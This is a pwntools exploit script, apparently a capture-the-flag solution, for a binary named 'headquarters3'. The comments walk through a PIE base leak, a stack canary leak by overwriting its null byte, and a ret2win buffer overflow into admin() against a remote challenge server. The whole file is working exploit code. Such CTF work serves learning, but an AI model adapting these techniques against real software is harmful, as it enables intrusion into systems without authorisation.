from pwn import *

elf = context.binary = ELF('../src/bin/headquarters3')

local = False

if not local:
    io = remote("challs.sieberr.live", 1005)
else:
    io = elf.process(stdin=PTY)
    # gdb.attach(io, '''b main
    #            b *main+0x50''')


# LEAK PIE
# on the stack there is the address of main().
# we can leak this by filling up the buffer till the main() address on the stack
payload = b'A'*56 # fill up the buffer till the main()
io.recvuntil(b'name')
io.send(payload)

io.recvuntil(b'A'*56)
leak = io.recvuntil(b',')[:-1]
pie = int.from_bytes(leak, byteorder='little')
pie = pie - elf.sym.main
print('PIE:', hex(pie))


# LEAK CANARY
# fill up the buffer until the canary, overwriting the canary's last byte (the null byte)
# so that printf will print the canary
payload = b'A'*56 + b'B'
io.recvuntil(b'NRIC')
io.send(payload)

# get the value of the canary based on the leak
io.recvuntil(b'B')
leak = io.recvline()[:7]
leak = b'\x00' + leak #to add the null byte of the canary that was overwritten 
canary = int.from_bytes(leak, byteorder='little')
print('Canary:', hex(canary))


# PERFORM RET2WIN
# fill up the buffer and canary
# add a ret gadget to prevent stack alignment issues
# and ret to admin()
payload = b'A'*40 # fill up the buffer
payload += p64(canary) # fill the canary
payload += b'B'*8 # fill up RBP
payload += p64(0x101a + pie)
payload += p64(elf.sym.admin + pie)

io.recvuntil(b'email')
io.send(payload)

io.interactive()
